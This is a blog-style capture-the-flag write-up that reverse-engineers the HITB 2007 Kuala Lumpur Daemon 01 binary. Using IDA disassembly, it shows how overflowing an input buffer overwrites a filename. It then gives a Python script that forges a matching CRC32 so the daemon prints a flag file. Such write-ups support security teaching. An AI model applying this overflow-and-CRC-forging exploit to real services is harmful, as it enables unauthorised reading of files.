---
title: Exploiting HITB 2007 KL CTF Daemon 01
author: lamer
excerpt: |
  |
    Daemon 01 in the HITBSecConf 2007 Kuala Lumpur's Capture the Flag competition is a classical buffer overflow with a CRC32 check. Exploiting can be easily done by matching this CRC value.
layout: post
tweetcount:
  - 0
shorturls:
  - 'a:4:{s:9:"permalink";s:72:"http://www.vnsecurity.net/2007/09/exploiting-hitb-2007-kl-ctf-daemon-01/";s:7:"tinyurl";s:26:"http://tinyurl.com/y85cojy";s:4:"isgd";s:18:"http://is.gd/aOubO";s:5:"bitly";s:0:"";}'
twittercomments:
  - 'a:0:{}'
tweetbackscheck:
  - 1408359077
category:
  - 'CTF - CLGT Crew'
---
## Identifying the main function

IDA will land us right here when it finishes analysis.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.text:08048830                 public start
.text:08048830 start           proc near
.text:08048830                 &lt;b&gt;xor&lt;/b&gt;     ebp, ebp
.text:08048832                 &lt;b&gt;pop&lt;/b&gt;     esi
.text:08048833                 &lt;b&gt;mov&lt;/b&gt;     ecx, esp
.text:08048835                 &lt;b&gt;and&lt;/b&gt;     esp, 0FFFFFFF0h
.text:08048838                 &lt;b&gt;push&lt;/b&gt;    eax
.text:08048839                 &lt;b&gt;push&lt;/b&gt;    esp
.text:0804883A                 &lt;b&gt;push&lt;/b&gt;    edx
.text:0804883B                 &lt;b&gt;push&lt;/b&gt;    offset sub_804C700
.text:08048840                 &lt;b&gt;push&lt;/b&gt;    offset sub_804C6A0
.text:08048845                 &lt;b&gt;push&lt;/b&gt;    ecx
.text:08048846                 &lt;b&gt;push&lt;/b&gt;    esi
.text:08048847                 &lt;b&gt;push&lt;/b&gt;    offset main
.text:0804884C                 &lt;b&gt;call&lt;/b&gt;    ___libc_start_main
</pre>

Notice at `08048847`, I have renamed the function as `main`. 

## Analyzing `main`

Let&#8217;s get to `main` now. The function starts with:

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.text:08048AA1 main            proc near               ; DATA XREF: start+17↑o
.text:08048AA1
.text:08048AA1 first_arg       = dword ptr -2F8h
.text:08048AA1 second_arg      = dword ptr -2F4h
.text:08048AA1 third_arg       = dword ptr -2F0h
.text:08048AA1 var_2EC         = dword ptr -2ECh
.text:08048AA1 var_2E8         = dword ptr -2E8h
.text:08048AA1 var_260         = dword ptr -260h
.text:08048AA1 num_read        = dword ptr -25Ch
.text:08048AA1 input_buffer    = dword ptr -258h
.text:08048AA1 var_4C          = dword ptr -4Ch
.text:08048AA1 filename        = dword ptr -48h
.text:08048AA1
.text:08048AA1                 &lt;b&gt;push&lt;/b&gt;    ebp
.text:08048AA2                 &lt;b&gt;mov&lt;/b&gt;     ebp, esp
.text:08048AA4                 &lt;b&gt;sub&lt;/b&gt;     esp, 2F8h       ; fildes
.text:08048AAA                 &lt;b&gt;and&lt;/b&gt;     esp, 0FFFFFFF0h
.text:08048AAD                 &lt;b&gt;mov&lt;/b&gt;     eax, 0
.text:08048AB2                 &lt;b&gt;add&lt;/b&gt;     eax, 0Fh
.text:08048AB5                 &lt;b&gt;add&lt;/b&gt;     eax, 0Fh
.text:08048AB8                 &lt;b&gt;shr&lt;/b&gt;     eax, 4
.text:08048ABB                 &lt;b&gt;shl&lt;/b&gt;     eax, 4
.text:08048ABE                 &lt;b&gt;sub&lt;/b&gt;     esp, eax
.text:08048AC0                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], offset static_buffer
.text:08048AC7                 &lt;b&gt;call&lt;/b&gt;    sub_80489E2
.text:08048ACC                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+third_arg], 200h
.text:08048AD4                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+second_arg], 0
.text:08048ADC                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+input_buffer]
.text:08048AE2                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], eax
.text:08048AE5                 &lt;b&gt;call&lt;/b&gt;    _memset
.text:08048AEA                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+third_arg], 40h
.text:08048AF2                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+second_arg], 0
.text:08048AFA                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+filename]
.text:08048AFD                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], eax
.text:08048B00                 &lt;b&gt;call&lt;/b&gt;    _memset
.text:08048B05                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+second_arg], offset aProcSelfMaps ; "/proc/self/maps"
.text:08048B0D                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+filename]
.text:08048B10                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], eax
.text:08048B13                 &lt;b&gt;call&lt;/b&gt;    _strcpy
.text:08048B18                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+third_arg], 400h
.text:08048B20                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+input_buffer]
.text:08048B26                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+second_arg], eax
.text:08048B2A                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], 0
.text:08048B31                 &lt;b&gt;call&lt;/b&gt;    _read
.text:08048B36                 &lt;b&gt;mov&lt;/b&gt;     [ebp+num_read], eax
.text:08048B3C                 &lt;b&gt;cmp&lt;/b&gt;     [ebp+num_read], 0FFFFFFFFh
.text:08048B43                 &lt;b&gt;jnz&lt;/b&gt;     short loc_8048B5D
.text:08048B45                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], offset aRead ; "read"
.text:08048B4C                 &lt;b&gt;call&lt;/b&gt;    _perror
.text:08048B51                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], 1
.text:08048B58                 &lt;b&gt;call&lt;/b&gt;    _exit
</pre>

Well, you may have noticed that the names are not what you have in your IDA listing. These names are *my* names given to those identifiers after analyzing the function. So let&#8217;s see how we could arrive to the same naming.

First, there is a call to `sub_80489E2` and a `static_buffer` is passed to it. You will be right to guess this is some kind of initialization routine. Why `static_buffer`? Because it is `static` (located in .bss segment) and it is a buffer.

Next to it, some sort of buffer is reset to 0 with memset (0&#215;200 bytes). Notice GCC uses `mov` instead of `push` to pass arguments to function. Some lowest (top) slots on the stack have been reserved for this purpose. So, a `mov` to the lowest slot is equivalent to the last `push`, or in other words, the first argument. And therefore I named the lowest slot `first_arg`, followed (logically) by `second_arg` and so on.

We see another buffer being reset to 0 (0&#215;40 bytes). Then right after that, `/proc/self/maps` is `strcpy`&#8216;d to that buffer. Well, let&#8217;s not waste anytime and mark it `filename`.

With one buffer marked, we still have one left. Luckily, the next call to `read` tells us that the remaining buffer should be named `input_buffer`. Right?

But, hey, wait, the `read` was for 0&#215;400 bytes while `input_buffer` is only (0&#215;258 &#8211; 0x4C) byte long. That is, if you fill `input_buffer` with (0&#215;258 &#8211; 0x4C) bytes you will hit `var_4C`, and if you fill 4 bytes more than that, you will hit the beginning of `filename`. How wonderful! It gives you control over `filename`.

Let&#8217;s move on.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.text:08048B5D loc_8048B5D:                            ; CODE XREF: main+A2↑j
.text:08048B5D                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+third_arg], offset aEtcFlagsDaemon ; "/etc/flags/daemon01.txt"
.text:08048B65                 &lt;b&gt;mov&lt;/b&gt;     eax, [ebp+num_read]
.text:08048B6B                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+second_arg], eax
.text:08048B6F                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+input_buffer]
.text:08048B75                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], eax
.text:08048B78                 &lt;b&gt;call&lt;/b&gt;    is_from_server
.text:08048B7D                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+third_arg], offset static_buffer
.text:08048B85                 &lt;b&gt;mov&lt;/b&gt;     eax, [ebp+num_read]
.text:08048B8B                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+second_arg], eax
.text:08048B8F                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+input_buffer]
.text:08048B95                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], eax
.text:08048B98                 &lt;b&gt;call&lt;/b&gt;    CRC32
.text:08048B9D                 &lt;b&gt;mov&lt;/b&gt;     [ebp+var_4C], eax
.text:08048BA0                 &lt;b&gt;cmp&lt;/b&gt;     [ebp+var_4C], 0FEEDAFEDh
.text:08048BA7                 &lt;b&gt;jnz&lt;/b&gt;     short loc_8048C25
.text:08048BA9                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+second_arg], offset aR ; "r"
.text:08048BB1                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+filename]
.text:08048BB4                 &lt;b&gt;mov&lt;/b&gt;     [esp+2F8h+first_arg], eax
.text:08048BB7                 &lt;b&gt;call&lt;/b&gt;    _fopen
.text:08048BBC                 &lt;b&gt;mov&lt;/b&gt;     [ebp+var_260], eax
.text:08048BC2                 &lt;b&gt;cmp&lt;/b&gt;     [ebp+var_260], 0
.text:08048BC9                 &lt;b&gt;jz&lt;/b&gt;      short loc_8048C25
</pre>

Please just take it for granted that at `08048B78` is a call to process score server packets. So let&#8217;s skip it over and analyze the next call.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">.text:08048A4C CRC32           proc near               ; CODE XREF: main+F7↓p
.text:08048A4C
.text:08048A4C var_8           = dword ptr -8
.text:08048A4C var_4           = dword ptr -4
.text:08048A4C arg_0           = dword ptr  8
.text:08048A4C arg_4           = dword ptr  0Ch
.text:08048A4C arg_8           = dword ptr  10h
.text:08048A4C
.text:08048A4C                 &lt;b&gt;push&lt;/b&gt;    ebp
.text:08048A4D                 &lt;b&gt;mov&lt;/b&gt;     ebp, esp
.text:08048A4F                 &lt;b&gt;sub&lt;/b&gt;     esp, 8
.text:08048A52                 &lt;b&gt;mov&lt;/b&gt;     [ebp+var_8], 0FFFFFFFFh
.text:08048A59                 &lt;b&gt;mov&lt;/b&gt;     [ebp+var_4], 0
.text:08048A60
.text:08048A60 loc_8048A60:                            ; CODE XREF: CRC32+4C↓j
.text:08048A60                 &lt;b&gt;mov&lt;/b&gt;     eax, [ebp+var_4]
.text:08048A63                 &lt;b&gt;cmp&lt;/b&gt;     eax, [ebp+arg_4]
.text:08048A66                 &lt;b&gt;jge&lt;/b&gt;     short loc_8048A9A
.text:08048A68                 &lt;b&gt;mov&lt;/b&gt;     eax, [ebp+var_8]
.text:08048A6B                 &lt;b&gt;mov&lt;/b&gt;     ecx, eax
.text:08048A6D                 &lt;b&gt;shr&lt;/b&gt;     ecx, 8
.text:08048A70                 &lt;b&gt;mov&lt;/b&gt;     eax, [ebp+var_4]
.text:08048A73                 &lt;b&gt;add&lt;/b&gt;     eax, [ebp+arg_0]
.text:08048A76                 &lt;b&gt;movzx&lt;/b&gt;   eax, byte ptr [eax]
.text:08048A79                 &lt;b&gt;xor&lt;/b&gt;     eax, [ebp+var_8]
.text:08048A7C                 &lt;b&gt;and&lt;/b&gt;     eax, 0FFh
.text:08048A81                 &lt;b&gt;lea&lt;/b&gt;     edx, ds:0[eax*4]
.text:08048A88                 &lt;b&gt;mov&lt;/b&gt;     eax, [ebp+arg_8]
.text:08048A8B                 &lt;b&gt;mov&lt;/b&gt;     eax, [edx+eax]
.text:08048A8E                 &lt;b&gt;xor&lt;/b&gt;     eax, ecx
.text:08048A90                 &lt;b&gt;mov&lt;/b&gt;     [ebp+var_8], eax
.text:08048A93                 &lt;b&gt;lea&lt;/b&gt;     eax, [ebp+var_4]
.text:08048A96                 &lt;b&gt;inc&lt;/b&gt;     dword ptr [eax]
.text:08048A98                 &lt;b&gt;jmp&lt;/b&gt;     short loc_8048A60
.text:08048A9A ; ---------------------------------------------------------------------------
.text:08048A9A
.text:08048A9A loc_8048A9A:                            ; CODE XREF: CRC32+1A↑j
.text:08048A9A                 &lt;b&gt;mov&lt;/b&gt;     eax, [ebp+var_8]
.text:08048A9D                 &lt;b&gt;not&lt;/b&gt;     eax
.text:08048A9F                 &lt;b&gt;leave&lt;/b&gt;
.text:08048AA0                 &lt;b&gt;retn&lt;/b&gt;
.text:08048AA0 CRC32           endp
</pre>

If you have seen CRC32 routine before, you will be able to tell this is it. A few signatures are the `0xFFFFFFFF` initial value, the &#8220;take each character, xor it, and logical and it with `0xFF`&#8221; (`movzx`, `xor` and `and` starting from `08048A76`, and the negation at `08048A9D`.

And you&#8217;ll be tempting to rename `static_buffer` to `crc32_table`. But that&#8217;s beside the point. 
Now we go back to the `main` function. After taking CRC32 value of the whole read `input_buffer`, the value is compared with `0xFEEDAFED`. If it is equal, then the `filename` is open, read and written out.

## Exploit it

Let&#8217;s gather what we&#8217;ve got. First we are able to overflow the `filename` buffer. Second, if the CRC value matches `0xFEEDAFED`, the file identified by `filename` will be opened, read, and written out to `stdout`. And there lies our only challenge, to construct a buffer with CRC32 value matching `0xFEEDAFED`.

<pre class="brush: plain; gutter: false; title: ; notranslate" title="">import zlib
buffer = "a" * (0x258 - 0x48) + "/etc/flags/daemon01.txtx00"

&lt;b&gt;def&lt;/b&gt; fix_crc(buffer, target_crc):
  buffer_crc = zlib.crc32(buffer)
  charset = [chr(x) &lt;b&gt;for&lt;/b&gt; x &lt;b&gt;in&lt;/b&gt; range(256)]
  fix = ['a'] * 4
  crc = [0] * 4
  &lt;b&gt;for&lt;/b&gt; fix[0] &lt;b&gt;in&lt;/b&gt; charset:
    crc[0] = zlib.crc32(fix[0], buffer_crc)
    &lt;b&gt;for&lt;/b&gt; fix[1] &lt;b&gt;in&lt;/b&gt; charset:
      crc[1] = zlib.crc32(fix[1], crc[0])
      &lt;b&gt;for&lt;/b&gt; fix[2] &lt;b&gt;in&lt;/b&gt; charset:
        crc[2] = zlib.crc32(fix[2], crc[1])
        &lt;b&gt;for&lt;/b&gt; fix[3] &lt;b&gt;in&lt;/b&gt; charset:
          crc[3] = zlib.crc32(fix[3], crc[2])
          &lt;b&gt;if&lt;/b&gt; (crc[3] &amp; 0xFFFFFFFF) == target_crc:
            &lt;b&gt;return&lt;/b&gt; ''.join(fix)

buffer = buffer + fix_crc(buffer, 0xFEEDAFED)
</pre>

Behold our super-elite Python code! It will generate an exploit string ready to be sent to port 1111. Of course it runs damn slow. You are better off applying the reverse CRC32 described by [anarchriz][1].

## Observation

This daemon is similar to last year HITB 2006 KL CTF. Last year the CRC32 is a bit different, it used the same lookup table but initial value was not the standard `0xFFFFFFFF` and there was no negation at the end. This year, the CRC32 is the standard CRC32 used in Zlib.

 [1]: http://www.woodmann.com/fravia/crctut1.htm